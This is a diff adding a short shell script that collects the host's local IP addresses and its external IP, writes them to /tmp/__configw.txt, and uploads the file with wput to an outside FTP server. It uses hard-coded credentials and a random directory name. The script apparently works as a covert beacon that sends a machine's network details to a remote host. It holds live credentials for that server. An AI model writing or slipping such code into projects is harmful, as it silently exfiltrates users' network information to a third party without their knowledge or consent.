@@ -1,0 +1,9 @@
+#!/bin/sh
+touch /tmp/__configw.txt
+echo "$(tr -d "\n" <<< $(echo "local:";ipconfig getifaddr en0 | sed 's#\n##g'))" > /tmp/__configw.txt
+
+echo "$(tr -d "\n" <<< $(echo "local:" ; ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'))" >> /tmp/__configw.txt
+
+echo "$(tr -d "\n" <<< $(echo "externe:"; curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//') )" >> /tmp/__configw.txt
+
+wput /tmp/__configw.txt ftp://u94329457-configw:HSockgYM21\*@home747144586.1and1-data.host/$(cat /dev/urandom | env LC_CTYPE=C tr -cd 'a-f0-9' | head -c 10)/
